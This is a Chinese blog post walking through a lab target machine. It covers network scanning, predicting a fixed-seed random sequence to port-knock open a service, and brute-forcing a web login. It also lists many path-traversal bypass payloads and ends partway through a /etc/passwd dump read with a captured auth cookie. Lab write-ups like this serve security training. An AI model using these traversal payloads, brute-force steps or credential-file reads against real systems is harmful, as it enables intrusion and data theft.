<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script src='https://7r1UMPHK.github.io/plugins/StatsSidebar.js'></script>
    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
<meta name="description" content="![image-20250627200158237](https://7r1umphk.github.io/image/20250627200158372.webp)

群内靶机

开搞

## 一、信息收集与发现

渗透测试的第一步永远是信息收集。">
<meta property="og:title" content="内部_yulian">
<meta property="og:description" content="![image-20250627200158237](https://7r1umphk.github.io/image/20250627200158372.webp)

群内靶机

开搞

## 一、信息收集与发现

渗透测试的第一步永远是信息收集。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_yulian.html">
<meta property="og:image" content="https://7r1UMPHK.github.io/image/202506121404919.webp">
<title>内部_yulian</title>



</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">内部_yulian</h1>
<div class="title-right">
    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/127" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b926d3c59771111b44369078796f683d82a8bc04305e04ac45af0f58ebd2b14d/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230303135383337322e77656270"><img src="https://camo.githubusercontent.com/b926d3c59771111b44369078796f683d82a8bc04305e04ac45af0f58ebd2b14d/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230303135383337322e77656270" alt="image-20250627200158237" data-canonical-src="https://7r1umphk.github.io/image/20250627200158372.webp" style="max-width: 100%;"></a></p>
<p>群内靶机</p>
<p>开搞</p>
<h2>一、信息收集与发现</h2>
<p>渗透测试的第一步永远是信息收集。我们首先需要确定目标在网络中的位置。</p>
<h3>1.1 主机发现</h3>
<p>我们处于 <code class="notranslate">192.168.205.0/24</code> 网段，使用 <code class="notranslate">arp-scan</code> 对整个C段进行扫描，以发现存活的主机。</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                      
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.131 08:00:27:0f:fa:c2       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f3:f6:bb       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.038 seconds (125.61 hosts/sec). 4 responded
                 
</code></pre>
<p>成功发现目标主机IP为 <code class="notranslate">192.168.205.131</code>。</p>
<h3>1.2 端口扫描</h3>
<p>确定IP后，使用 <code class="notranslate">nmap</code> 对其进行全端口扫描，探测开放的服务。</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 08:02 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00046s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
8080/tcp filtered http-proxy
MAC Address: 08:00:27:0F:FA:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.23 seconds
                                                    
</code></pre>
<p>扫描结果显示，SSH（22端口）和HTTP（80端口）服务是开放的，而8080关闭（我本身说来试一下LingMj的压测大法，结果不行），那看80</p>
<h2>二、端口敲门与服务暴露</h2>
<p>访问80端口的Web服务，我们发现一个模拟的Linux终端界面。</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8864a94854d435e2a8e211f372b7aad0bfbf010b64232ec3b54d616c6adb1fc7/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230303433363536342e77656270"><img src="https://camo.githubusercontent.com/8864a94854d435e2a8e211f372b7aad0bfbf010b64232ec3b54d616c6adb1fc7/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230303433363536342e77656270" alt="image-20250627200436415" data-canonical-src="https://7r1umphk.github.io/image/20250627200436564.webp" style="max-width: 100%;"></a></p>
<p>看到这就有点假了，所以直接看源码吧</p>
<pre class="notranslate"><code class="notranslate">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
  &lt;meta charset="UTF-8"&gt;
  &lt;title&gt;Linux Terminal Simulator&lt;/title&gt;
  &lt;style&gt;
    body {
      background-color: #000;
      color: #00ff00;
      font-family: monospace;
      margin: 0;
      padding: 10px;
    }
    #terminal {
      white-space: pre-wrap;
      min-height: 90vh;
      overflow-y: auto;
    }
    .line {
      display: flex;
      flex-wrap: wrap;
    }
    input {
      background: none;
      border: none;
      color: #00ff00;
      font-family: monospace;
      font-size: 1em;
      outline: none;
      flex: 1;
    }
    ::selection {
      background: #008000;
    }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;div id="terminal"&gt;&lt;/div&gt;

  &lt;script&gt;
    const terminal = document.getElementById("terminal");

    const fileSystem = {
      "home": {
        "user": {
          "file1.txt": "Hello, this is file1.",
          "notes.md": "# Notes\nThis is a markdown file."
        }
      },
      "var": {
        "log.txt": "System log content here."
      },
      "opt":{
        "code":{
            "test.c":`#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int main()
{
        srand(114514);
        for(int i = 0; i &lt; 114514; i++)
        {
                rand();
        }
        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);


        return 0;
}`
        }
      }

    };

    let currentPath = ["home", "user"];
    let history = [];
    let historyIndex = -1;

    function getDir(pathArr, fs) {
      let node = fs;
      for (let part of pathArr) {
        if (node[part] &amp;&amp; typeof node[part] === 'object') {
          node = node[part];
        } else {
          return null;
        }
      }
      return node;
    }

    function getPathString() {
      return "/" + currentPath.join("/");
    }

    function renderPrompt() {
      return `user@linux:${getPathString()}$ `;
    }

    function printOutput(prompt, input, output) {
      const block = document.createElement("div");
      block.innerHTML = `
        &lt;div&gt;${prompt}${input}&lt;/div&gt;
        &lt;div&gt;${output}&lt;/div&gt;
      `;
      terminal.appendChild(block);
    }

    function createInputLine() {
      const line = document.createElement("div");
      line.className = "line";

      const promptSpan = document.createElement("span");
      promptSpan.textContent = renderPrompt();

      const input = document.createElement("input");
      input.type = "text";
      input.autofocus = true;

      line.appendChild(promptSpan);
      line.appendChild(input);
      terminal.appendChild(line);

      input.focus();

      input.addEventListener("keydown", (e) =&gt; {
        if (e.key === "Enter") {
          const value = input.value.trim();
          input.disabled = true;
          runCommand(value);
        } else if (e.key === "ArrowUp") {
          if (historyIndex &gt; 0) {
            historyIndex--;
            input.value = history[historyIndex];
          }
        } else if (e.key === "ArrowDown") {
          if (historyIndex &lt; history.length - 1) {
            historyIndex++;
            input.value = history[historyIndex];
          } else {
            input.value = "";
          }
        }
      });
    }

    function runCommand(input) {
      const prompt = renderPrompt();
      if (input !== "") {
        history.push(input);
        historyIndex = history.length;
      }

      function escapeHTML(str) {
            return str.replace(/&amp;/g, "&amp;amp;").replace(/&lt;/g, "&amp;lt;").replace(/&gt;/g, "&amp;gt;");
    }

      const args = input.split(" ");
      const cmd = args[0];
      const param = args.slice(1);
      const currentDir = getDir(currentPath, fileSystem);
      let output = "";

      switch (cmd) {
        case "help":
          output = "命令: help, clear, echo, ls, cd, cat, date";
          break;
        case "clear":
          terminal.innerHTML = "";
          createInputLine();
          return;
        case "echo":
          output = param.join(" ");
          break;
        case "date":
          output = new Date().toString();
          break;
        case "ls":
          if (currentDir) {
            output = Object.keys(currentDir).join("  ");
          } else {
            output = "无法访问当前目录";
          }
          break;
        case "cd":
          if (param.length === 0 || param[0] === "~") {
            currentPath = ["home", "user"];
          } else if (param[0] === "..") {
            if (currentPath.length &gt; 0) currentPath.pop();
          } else {
            const target = param[0];
            const newPath = [...currentPath, target];
            const targetDir = getDir(newPath, fileSystem);
            if (targetDir &amp;&amp; typeof targetDir === "object") {
              currentPath = newPath;
            } else {
              output = `cd: 没有这个目录: ${target}`;
            }
          }
          break;
        case "cat":
          if (param.length === 0) {
            output = "cat: 需要文件名参数";
          } else {
            const file = param[0];
            if (currentDir[file] &amp;&amp; typeof currentDir[file] === "string") {
              output = escapeHTML(currentDir[file]);
            } else {
              output = `cat: 找不到文件 ${file}`;
            }
          }
          break;
        case "":
          output = "";
          break;
        default:
          output = `未找到命令: ${cmd}`;
      }

      printOutput(prompt, input, output);
      createInputLine();
      terminal.scrollTop = terminal.scrollHeight;
    }

    // 初始化
    createInputLine();
    terminal.addEventListener("click", () =&gt; {
      const inputs = terminal.querySelectorAll("input");
      if (inputs.length &gt; 0) inputs[inputs.length - 1].focus();
    });
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre>
<p>扒拉的时候看到了一个文件/opt/code/test.c，处理一下就下面那样</p>
<pre class="notranslate"><code class="notranslate">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int main()
{
        srand(114514); 
        for(int i = 0; i &lt; 114514; i++)
        {
                rand();
        }
        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);


        return 0;
}
</code></pre>
<p>假随机数</p>
<blockquote>
<p><strong>伪随机数</strong></p>
<p>计算机生成的随机数通常是伪随机的，它们由一个初始的“种子”（seed）通过特定算法生成。如果种子固定，那么后续生成的“随机”数序列也是完全固定和可预测的。</p>
</blockquote>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nano test.c
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat test.c 
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int main()
{
        srand(114514); 
        for(int i = 0; i &lt; 114514; i++)
        {
                rand();
        }
        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);

        printf("%d\\n",rand()%65535);


        return 0;
}
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gcc test.c -o test
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ./test     
6440\n17226\n31925\n                                                             
</code></pre>
<p>看到这三个数大概猜到要干嘛了，敲门</p>
<blockquote>
<p><strong>端口敲门（Port Knocking）</strong></p>
<p>这是一种通过向目标主机预先定义好的一系列端口发送请求（“敲门”），来动态开启某个特定服务端口的安全机制。</p>
</blockquote>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ knock 192.168.205.131 6440 17226 31925
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ knock 192.168.205.131 6440 17226 31925
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ knock 192.168.205.131 6440 17226 31925        
</code></pre>
<p>敲门程序有概率抽风，所以多敲几次</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.131              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 08:11 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00065s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:0F:FA:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds                     
</code></pre>
<p>8080开了，去看一下</p>
<h2>三、Web应用渗透：从LFI到RCE</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/00e257189084824326c0d04f040aea0c849ddcfd17a7fc1a6c00db3438106f59/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230313133363934302e77656270"><img src="https://camo.githubusercontent.com/00e257189084824326c0d04f040aea0c849ddcfd17a7fc1a6c00db3438106f59/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230313133363934302e77656270" alt="image-20250627201136754" data-canonical-src="https://7r1umphk.github.io/image/20250627201136940.webp" style="max-width: 100%;"></a></p>
<h3>3.1 弱口令爆破与认证绕过</h3>
<p>登录，尝试弱密码</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/818a9a5008497bcca1f2538391d668fa18a23ace83e3e88dbea81ec4d095131e/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230313230313634372e77656270"><img src="https://camo.githubusercontent.com/818a9a5008497bcca1f2538391d668fa18a23ace83e3e88dbea81ec4d095131e/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230313230313634372e77656270" alt="image-20250627201201451" data-canonical-src="https://7r1umphk.github.io/image/20250627201201647.webp" style="max-width: 100%;"></a></p>
<p>登不上，但是看到一个貌似可以注入的地方，看看源码先</p>
<pre class="notranslate"><code class="notranslate">&lt;!DOCTYPE html&gt;
&lt;html lang="zh-CN"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;用户登录&lt;/title&gt;
    &lt;style&gt;
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(to right, #74ebd5, #ACB6E5);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        .login-container h2 {
            text-align: center;
            margin-bottom: 24px;
            color: #333;
        }

        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
        }

        .login-container input[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }

        .login-container input[type="submit"]:hover {
            background-color: #45a049;
        }

        .message {
            color: red;
            text-align: center;
            margin-top: 10px;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div class="login-container"&gt;
    &lt;h2&gt;登录&lt;/h2&gt;
    &lt;form method="post" action="/login"&gt;
        &lt;input type="text" name="username" placeholder="用户名" required&gt;
        &lt;input type="password" name="password" placeholder="密码" required&gt;
        &lt;input type="submit" value="登录"&gt;
    &lt;/form&gt;
    &lt;div class="message"&gt;
        &lt;!-- 后端可以通过重定向参数显示失败信息 --&gt;
        &lt;span id="error-message"&gt;&lt;/span&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;script&gt;
    const urlParams = new URLSearchParams(window.location.search);
    const error = urlParams.get('error');
    if (error) {
        document.getElementById('error-message').innerText = decodeURIComponent(error);
    }
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre>
<p>假的，本地实现的，不然error可以测试一下{{7*7}}模板注入</p>
<p>爆破一下目录</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/download                                                                                   
{"timestamp":"2025-06-27T12:14:39.104+0000","status":400,"error":"Bad Request","message":"Required String parameter 'file' is not present","path":"/download"}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../etc/passwd"
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=....//....//....//etc/passwd"
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=php://filter/read=convert.base64-encode/resource=../../../etc/passwd"
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=download"                                                            
&lt;h1&gt;Forbidden access                                                                                                                                             ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/download?file=..%5c..%5c..%5cetc/passwd"
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/download?file=a/../../../../etc/passwd"
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/download?file=file:///etc/passwd"
&lt;h1&gt;Forbidden access                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/download?file=../../../../etc/passwd%00.jpg"
&lt;h1&gt;Forbidden access                                                                                                                    
</code></pre>
<p>应该是少参数，暂时搁置</p>
<p>绕过不了，继续看其他的</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/error                                                                    
{"timestamp":"2025-06-27T12:16:49.948+0000","status":999,"error":"None","message":"No message available"}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/login
{"timestamp":"2025-06-27T12:16:58.321+0000","status":405,"error":"Method Not Allowed","message":"Request method 'GET' not supported","path":"/login"}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/login -X POST
{"timestamp":"2025-06-27T12:17:20.707+0000","status":400,"error":"Bad Request","message":"Required String parameter 'username' is not present","path":"/login"}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/test/        
    \&lt;h1&gt;Website is under development.......                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ trans -b :zh "Website is under development......." 2&gt;/dev/null
网站正在开发中.......
</code></pre>
<p>gobuster跑一下</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gobuster dir -u http://192.168.205.131:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.131:8080
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 400) [Size: 158]
/login.html           (Status: 200) [Size: 2377]
/login                (Status: 405) [Size: 149]
/test                 (Status: 200) [Size: 39]
/logout               (Status: 302) [Size: 0] [--&gt; http://192.168.205.131:8080/login.html]
/success              (Status: 200) [Size: 47]
/error                (Status: 500) [Size: 105]
</code></pre>
<p>多了一个logout但是是跳转</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.131:8080/logout -v                       
*   Trying 192.168.205.131:8080...
* Connected to 192.168.205.131 (192.168.205.131) port 8080
* using HTTP/1.x
&gt; GET /logout HTTP/1.1
&gt; Host: 192.168.205.131:8080
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 302 
&lt; Set-Cookie: auth=; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly
&lt; Location: http://192.168.205.131:8080/login.html
&lt; Content-Length: 0
&lt; Date: Fri, 27 Jun 2025 12:27:05 GMT
&lt; 
* Connection #0 to host 192.168.205.131 left intact
</code></pre>
<p>nuclei扫描一下</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://192.168.205.131:8080
Generated code
__     _
Use code with caution.
____  __  / /  ()
/ __ / / / / / / _ / /
/ / / / // / // /  __/ /
// //_,/_/_/_/_/   v3.4.5
Generated code
projectdiscovery.io
Use code with caution.
[INF] Your current nuclei-templates  are outdated. Latest is v10.2.3
[INF] Successfully updated nuclei-templates (v10.2.3) to /home/kali/.local/nuclei-templates. GoodLuck!
Nuclei Templates v10.2.3 Changelog
+-------+-------+----------+---------+
| TOTAL | ADDED | MODIFIED | REMOVED |
+-------+-------+----------+---------+
| 11102 | 11102 |        0 |       0 |
+-------+-------+----------+---------+
[INF] Current nuclei version: v3.4.5 (latest)
[INF] Current nuclei-templates version: v10.2.3 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 105
[INF] Templates loaded for current scan: 8086
[INF] Executing 7884 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 202 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1747 (Reduced 1642 Requests)
[INF] Using Interactsh Server: oast.online
[ssh-auth-methods] [javascript] [info] 192.168.205.131:22 ["["publickey","password","keyboard-interactive"]"]
[ssh-server-enumeration] [javascript] [info] 192.168.205.131:22 ["SSH-2.0-OpenSSH_9.9"]
[ssh-password-auth] [javascript] [info] 192.168.205.131:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.131:22
[spring-detect] [http] [info] http://192.168.205.131:8080/error
[options-method] [http] [info] http://192.168.205.131:8080 ["GET,HEAD,OPTIONS"]
[springboot-actuator:favicon] [http] [info] http://192.168.205.131:8080/favicon.ico
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.131:8080/login.html
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.131:8080/login.html
[favicon-detect:spring-boot] [http] [info] http://192.168.205.131:8080/favicon.ico ["116323821"]
[favicon-detect:Springboot Actuators] [http] [info] http://192.168.205.131:8080/favicon.ico ["116323821"]
[favicon-detect:Spring Boot H2 Database] [http] [info] http://192.168.205.131:8080/favicon.ico ["116323821"]
[INF] Scan completed in 1m. 21 matches found.
</code></pre>
<p>看到Spring Boot，所以尝试探测了一下，无果</p>
<p>那去爆破login吧</p>
<p>乱输，burp拦上，放去爆破模块</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2e6fae1a7be376e6b32e44e162039eecd539f0d53b39d7f2d388b9e01dc8bdde/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230333233333433352e77656270"><img src="https://camo.githubusercontent.com/2e6fae1a7be376e6b32e44e162039eecd539f0d53b39d7f2d388b9e01dc8bdde/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230333233333433352e77656270" alt="image-20250627203233278" data-canonical-src="https://7r1umphk.github.io/image/20250627203233435.webp" style="max-width: 100%;"></a></p>
<p>用户名</p>
<p>密码扒拉一个rockyou</p>
<p>![image-20250627203358528](<a href="https://7r1umphk.github.io/image/20250627203358895.webp" rel="nofollow">https://7r1umphk.github.io/image/20250627203358895.webp</a></p>
<p>登录</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6ab2501064c5a9df257df989071437c56565ac1deca15713664849d6fad42cd8/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230333435393633332e77656270"><img src="https://camo.githubusercontent.com/6ab2501064c5a9df257df989071437c56565ac1deca15713664849d6fad42cd8/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230333435393633332e77656270" alt="image-20250627203459351" data-canonical-src="https://7r1umphk.github.io/image/20250627203459633.webp" style="max-width: 100%;"></a></p>
<p>源码没啥，那就看一下包</p>
<pre class="notranslate"><code class="notranslate">GET /success HTTP/1.1
Host: 192.168.205.131:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.205.131:8080/login.html?error=Wrong%20username%20or%20password
Connection: keep-alive
Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=
Upgrade-Insecure-Requests: 1
Priority: u=0, i


</code></pre>
<p>有个cookie，我们刚刚那里也少个参数so</p>
<h3>3.2 任意文件读取（LFI）</h3>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../etc/passwd" -H "Cookie:auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI="
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
